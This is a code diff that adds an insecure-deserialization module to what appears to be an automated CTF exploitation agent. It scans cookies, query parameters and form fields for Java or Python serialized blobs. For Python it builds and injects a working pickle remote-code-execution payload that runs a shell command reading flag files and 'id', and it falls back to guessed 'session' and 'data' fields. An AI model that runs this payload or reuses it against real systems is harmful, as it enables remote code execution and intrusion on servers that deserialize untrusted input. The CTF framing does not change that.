@@ -9,6 +9,8 @@ provides ``state``, ``tool_guard``, ``_runtime_proxy_action``, ``_scan_and_store
 
 from __future__ import annotations
 
+import base64
+import binascii
 import re
 from typing import Any
 from urllib.parse import parse_qs, urlencode, urljoin, urlparse
@@ -531,3 +533,263 @@ class GenericInjectionChainMixin:
             progress=progress,
             reason="; ".join(dict.fromkeys(reasons[:5])) or "nosql_injection exhausted",
         )
+
+    # ------------------------------------------------------------------
+    # Insecure deserialization (Java / Python pickle)
+    # ------------------------------------------------------------------
+    # CTF-pragmatic stance mirroring graphql/nosql: Python pickle gets a real,
+    # stdlib-only RCE probe (we can *build* the gadget locally — pickle.dumps
+    # records the reduce callable by reference, it never executes it; execution
+    # only happens on the target's loads). Java serialized surfaces get
+    # detection + a vulnerability note (full exploitation needs an external
+    # ysoserial gadget library, out of scope for an in-process probe), an
+    # honest degradation rather than a stub that claims more than it does.
+
+    # Confirms RCE deterministically even when no flag file is present.
+    _DESER_RCE_MARKER = "DESER_RCE_OK"
+    _DESER_RCE_COMMAND = (
+        "cat /flag /flag.txt /flag* /app/flag* /root/flag* /tmp/flag* 2>/dev/null; "
+        "id; echo " + _DESER_RCE_MARKER
+    )
+
+    @staticmethod
+    def _detect_serialized_blob(value: str) -> tuple[str, str] | None:
+        """Classify a string as a serialized-object blob.
+
+        Returns ``(lang, encoding)`` — ``lang`` ∈ {"java", "python"}, ``encoding``
+        currently always ``"base64"`` (the form that survives cookies/params) —
+        or ``None``. Java serialized streams start ``\\xac\\xed`` (base64 "rO0");
+        Python pickle protocol 2-5 starts ``\\x80\\x0[2-5]`` (base64 "gA…").
+        """
+        text = (value or "").strip()
+        if len(text) < 8:
+            return None
+        # Cheap textual prefix screen before paying for a decode.
+        if text.startswith("rO0"):
+            return ("java", "base64")
+        for candidate in (text, text + "=" * (-len(text) % 4)):
+            for decoder in (base64.b64decode, base64.urlsafe_b64decode):
+                try:
+                    decoded = decoder(candidate)
+                except (binascii.Error, ValueError):
+                    continue
+                if decoded.startswith(b"\xac\xed"):
+                    return ("java", "base64")
+                if decoded[:1] == b"\x80" and decoded[1:2] in (b"\x02", b"\x03", b"\x04", b"\x05"):
+                    return ("python", "base64")
+                break
+        return None
+
+    def _collect_deserialization_carriers(
+        self,
+        target: str,
+        page_features: dict[str, Any],
+    ) -> list[dict[str, Any]]:
+        """Find request locations carrying a serialized-object blob.
+
+        Scans cookies, query parameters (links/observations) and POST form
+        fields. Each carrier records where to re-inject our payload and which
+        language/encoding the original blob used.
+        """
+        base = _base_target(target)
+        carriers: list[dict[str, Any]] = []
+        seen: set[tuple[str, str, str]] = set()
+
+        def _add(location: str, name: str, endpoint: str, lang: str, encoding: str, **extra: Any) -> None:
+            dedup = (location, name, endpoint)
+            if dedup in seen:
+                return
+            seen.add(dedup)
+            carriers.append(
+                {"location": location, "name": name, "endpoint": endpoint, "lang": lang, "encoding": encoding, **extra}
+            )
+
+        # Cookies (page_features["cookies"] is a "a=b; c=d" string).
+        for cookie_part in str(page_features.get("cookies") or "").split(";"):
+            if "=" not in cookie_part:
+                continue
+            name, value = cookie_part.split("=", 1)
+            detected = self._detect_serialized_blob(value.strip())
+            if detected:
+                _add("cookie", name.strip(), base + "/", detected[0], detected[1])
+
+        # Query parameters from links / observation URLs.
+        seeds = list(page_features.get("raw_links") or []) + list(page_features.get("endpoints") or [])
+        if self.state is not None:
+            for observation in self.state.observations:
+                if isinstance(observation.metadata, dict):
+                    for key in ("url", "final_url"):
+                        url_value = str(observation.metadata.get(key) or "").strip()
+                        if url_value:
+                            seeds.append(url_value)
+        for raw in seeds:
+            text = str(raw or "").strip()
+            if not text:
+                continue
+            absolute = urljoin(base + "/", text)
+            parsed = urlparse(absolute)
+            if not parsed.query:
+                continue
+            for key, values in parse_qs(parsed.query, keep_blank_values=True).items():
+                detected = self._detect_serialized_blob(values[0] if values else "")
+                if detected:
+                    _add("param", key, absolute, detected[0], detected[1])
+
+        # POST form fields (hidden/text) carrying a blob.
+        for form in page_features.get("forms") or []:
+            if not isinstance(form, dict):
+                continue
+            method = str(form.get("method") or "GET").strip().upper()
+            action = urljoin(target if target.endswith("/") else target + "/", str(form.get("action") or "").strip())
+            for field in form.get("fields") or form.get("inputs") or []:
+                if not isinstance(field, dict):
+                    continue
+                detected = self._detect_serialized_blob(str(field.get("value") or ""))
+                if detected:
+                    _add("body", str(field.get("name") or "data"), action, detected[0], detected[1], method=method)
+
+        return carriers
+
+    @staticmethod
+    def _build_python_pickle_payload(command: str, encoding: str = "base64") -> str:
+        """Build a base64 pickle whose ``loads`` runs ``command`` on the target.
+
+        Safe to construct in-process: ``pickle.dumps`` records the reduce
+        callable (``subprocess.check_output``) by reference and never invokes it;
+        only the target's ``pickle.loads`` executes it. ``check_output`` returns
+        the command's stdout, so the flag/marker surfaces when the sink reflects
+        the deserialized value.
+        """
+        import pickle
+        import subprocess
+
+        class _PickleRCE:
+            def __reduce__(self):
+                return (subprocess.check_output, (["sh", "-c", command],))
+
+        raw = pickle.dumps(_PickleRCE())
+        if encoding == "urlsafe":
+            return base64.urlsafe_b64encode(raw).decode("ascii")
+        return base64.b64encode(raw).decode("ascii")
+
+    async def _run_insecure_deserialization_strategy(
+        self,
+        target: str,
+        page_features: dict[str, Any],
+    ) -> _ChainOutcome:
+        """Insecure-deserialization probe (Java detect / Python pickle RCE).
+
+        Locates serialized-object carriers (cookie / query param / form field).
+        For Python pickle carriers it re-injects a stdlib pickle gadget that
+        runs a flag-read + ``id`` command, confirming via reflected flag /
+        ``DESER_RCE_OK`` marker / ``uid=``. Java carriers are surfaced as a
+        vulnerability note (exploitation needs an external ysoserial gadget).
+        """
+        self.tool_guard.require(["http_request"])
+        carriers = self._collect_deserialization_carriers(target, page_features)
+        host = urlparse(target).netloc or target
+
+        # Fallback: source/runtime clues suggest pickle but no blob is exposed —
+        # try the conventional carriers so a bare hint still gets one real shot.
+        if not any(c["lang"] == "python" for c in carriers) and self._has_python_pickle_clue(page_features):
+            base = _base_target(target)
+            carriers.append({"location": "cookie", "name": "session", "endpoint": base + "/", "lang": "python", "encoding": "base64"})
+            carriers.append({"location": "body", "name": "data", "endpoint": base + "/", "lang": "python", "encoding": "base64", "method": "POST"})
+
+        if not carriers:
+            return _ChainOutcome(progress=False, reason="insecure_deserialization: no serialized carrier")
+
+        progress = False
+        reasons: list[str] = []
+        for carrier in carriers:
+            if carrier["lang"] == "java":
+                progress = True
+                reasons.append(f"java serialized blob in {carrier['location']} {carrier['name']} @ {carrier['endpoint']}")
+                await self._store_note(
+                    key="ctf_java_deserialization_surface",
+                    value=f"{carrier['location']}:{carrier['name']} @ {carrier['endpoint']}",
+                    category="vulnerability",
+                    target=host,
+                    url=carrier["endpoint"],
+                )
+                continue
+
+            payload = self._build_python_pickle_payload(self._DESER_RCE_COMMAND, carrier.get("encoding", "base64"))
+            outcome = await self._send_deserialization_payload(target, carrier, payload)
+            progress = progress or outcome.progress
+            if outcome.flag:
+                return outcome
+            if outcome.reason:
+                reasons.append(outcome.reason)
+
+        return _ChainOutcome(
+            progress=progress,
+            reason="; ".join(dict.fromkeys(reasons[:5])) or "insecure_deserialization exhausted",
+        )
+
+    @staticmethod
+    def _has_python_pickle_clue(page_features: dict[str, Any]) -> bool:
+        blob = (
+            str(page_features.get("content") or "")
+            + " "
+            + str(page_features.get("html") or "")
+        ).lower()
+        return any(token in blob for token in ("pickle", "cpickle", "__reduce__", "loads(", "yaml.load", "marshal.loads"))
+
+    async def _send_deserialization_payload(
+        self,
+        target: str,
+        carrier: dict[str, Any],
+        payload: str,
+    ) -> _ChainOutcome:
+        """Re-inject a pickle payload into one carrier and judge the response."""
+        endpoint = str(carrier["endpoint"])
+        location = carrier["location"]
+        name = carrier["name"]
+        if location == "cookie":
+            opts: dict[str, Any] = {"method": "GET", "url": endpoint, "headers": {"Cookie": f"{name}={payload}"}}
+        elif location == "param":
+            parsed = urlparse(endpoint)
+            params = parse_qs(parsed.query, keep_blank_values=True)
+            params[name] = [payload]
+            opts = {"method": "GET", "url": parsed._replace(query=urlencode(params, doseq=True)).geturl()}
+        else:  # body
+            opts = {"method": str(carrier.get("method") or "POST").upper(), "url": endpoint, "data": {name: payload}}
+
+        response = await self._runtime_proxy_action(
+            "request",
+            timeout=15,
+            audit_target=endpoint,
+            audit_metadata={"phase": "insecure_deserialization", "carrier": location},
+            **opts,
+        )
+        if not isinstance(response, dict):
+            return _ChainOutcome(progress=False, reason="")
+        body = str(response.get("body") or "")
+        await self._scan_and_store(body, endpoint, evidence_source="http-response")
+
+        if extracted_flag := self._extract_flag(body):
+            verification = await self._observe_flag(
+                extracted_flag,
+                target,
+                evidence_source="http-response",
+                rationale="pickle deserialization RCE",
+                evidence_url=endpoint,
+                evidence_snippet=body[:240],
+                strategy_kind="insecure_deserialization",
+            )
+            if verification.decision in {"verified", "runtime"}:
+                return _ChainOutcome(progress=True, flag=verification.flag, reason=f"pickle RCE flag at {endpoint}")
+            return _ChainOutcome(progress=True, reason=f"pickle produced {verification.decision} flag")
+
+        rce_confirmed = self._DESER_RCE_MARKER in body or bool(re.search(r"uid=\d+\(", body))
+        if rce_confirmed:
+            await self._store_note(
+                key="ctf_python_pickle_rce",
+                value=f"{location}:{name} @ {endpoint}",
+                category="vulnerability",
+                target=urlparse(target).netloc or target,
+                url=endpoint,
+            )
+            return _ChainOutcome(progress=True, reason=f"pickle RCE confirmed at {endpoint} ({location})")
+        return _ChainOutcome(progress=False, reason="")
